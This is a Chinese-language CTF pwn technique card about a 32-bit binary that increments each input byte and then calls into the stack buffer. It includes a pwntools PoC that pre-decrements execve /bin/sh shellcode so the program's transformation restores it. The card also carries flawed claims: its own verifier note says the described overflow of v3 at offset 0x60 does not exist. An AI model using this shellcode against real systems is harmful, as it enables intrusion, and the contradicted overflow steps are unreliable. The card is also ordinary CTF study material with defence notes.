---
id: ctf-pwn-call-eax-stack-shellcode-byte-inc1
title: 程序对输入逐字节自增 1 后再 call eax 执行栈上数据：预先减 1 编码 shellcode 即可落地
type: scenario
domain: ctf
path: ctf/pwn
technique: byte-increment-encoded-shellcode-call-eax
aliases:
- 输入每字节加一
- 编码 shellcode 抵消变换
- call eax 栈上执行
- 自修改输入变换
tags:
- pwn
- shellcode
- encoding
- call-eax
- 32bit
- ctf
cve: []
severity: high
confidence: high
status: draft
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:48:46+08:00'
  notes: 已对照原文核对；本次核对未读取图片；逐字节 ++buf[i] 与 call eax 执行栈上数据、预减 1 编码的 PoC 均与正文一致；但原文 read(0,buf,0x60) 与 buf[96] 等长、v3 由 lea [ebp+buf] 赋值，不存在「溢出去改 v3」这一步，卡内一句话结论与触发条件中「v3 可被同一缓冲区溢出改写」「需长度足够溢出到该槽位」不成立，应改为 call 目标恒为 buf 起始、只需编码 shellcode 即可
---

## 一句话结论

`read(0, buf, 0x60)` 之后程序对 `buf` 每个字节执行 `++buf[i]`，再用 `v3 = buf; call eax`（`v3` 存在栈上、可被同一缓冲区溢出改写）跳过去执行——把真实 shellcode 每个字节预先减 1 送入，程序加 1 后恢复原样，即可在栈上执行命令。

## 原理

- 输入变换是可逆的确定性映射 `b -> b+1`，所以发送 `(b-1) mod 256` 即可让程序处理后得到 `b`；这层变换只是“反调试/反 payload”混淆，不构成真正的编码强度。
- `v3 = buf` 后紧跟 `call eax`（汇编 `mov [ebp+var_14], eax; mov eax,[ebp+var_14]; call eax`），`var_14` 位于栈上、且在 `buf` 之后，因此同一 `read` 的溢出可以把它改成任意地址，本次直接指向 `buf` 起始。
- 关键点：变换发生在 `read` 之后、`call` 之前，因此“先写 payload 再被改写”的顺序不会破坏溢出数据本身（溢出部位同样被 +1，需一并预减）。

## 触发条件

- 输入缓冲与函数指针/跳转目标位于同一栈帧，长度足够溢出到该槽位。
- 栈可执行（无 NX）或程序显式 `mprotect`/`mmap` 出可执行内存；本例为 32 位无 NX。
- 变换规则已知且可逆（逐字节 +1、-1、异或常量等）。

## 利用步骤

1. 反编译确认 `for (i=0;i<v4;i++) ++buf[i];` 的变换方向与作用范围。
2. 取一段 `execve("/bin/sh",0,0)` shellcode（如 23 字节 i386 版本），对每个字节 `(b-1)&0xff` 编码。
3. 构造 `flat({0x0: encoded_shellcode, 0x60: p32(buf_addr)})`：偏移 `0x60` 处覆盖 `v3`/函数指针为 `buf` 地址（若已知栈地址直接写，否则用泄露值）。
4. 发送并进入交互，`call eax` 落到解码后的 shellcode。

## PoC

```python
from pwn import *
context(arch='i386', os='linux')
p = process('./rhg6')

def dec1(buf):
    return bytes((b - 1) % 256 for b in buf)

sc = asm(shellcraft.i386.execve_bin_sh)          # 真实 shellcode
payload = dec1(sc)                                # 抵消程序的 ++buf[i]
p.recvuntil(b'please input shellcode')
p.send(payload.ljust(0x60, b'\xff'))              # 0xff 加 1 后为 0x00，填充安全
p.interactive()
```

## 变体与关联

- 变体：变换为 `--buf[i]`、`buf[i] ^= k`、`buf[i] += i` 时同样按逆运算编码，注意作用范围是否包含溢出槽位。
- 变体：若 `call` 目标不可直接改写，可溢出栈上函数指针或返回地址，跳到 `jmp esp`/`call esp` 再回落到解码后的缓冲区。
- 关联：[[ctf-pwn-stack-chk-fail-got-leave-ret-jmp-rsp-shellcode]]（栈上 shellcode 落地）、[[ctf-pwn-shellcode-byte-whitelist-imul-add-xor-shmget-orw]]（输入字节受限时的编码构造）。
- 边界：开启 NX 后栈上数据不可执行；变换若在 `call` 之后才做、或对长度做了额外校验，则该编码手法失效。

## 检测与防御

- 检测：反编译中出现“读入后对缓冲区逐字节自增/自减”的循环，配合间接 `call`/`jmp` 寄存器。
- 修复：开启 NX（`-z noexecstack`）、PIE、Canary；禁止可执行栈；对输入做完整性与长度双重校验。
- 加固：不在同一缓冲区存放数据与跳转目标；使用 `mprotect` 只读映射存放输入。
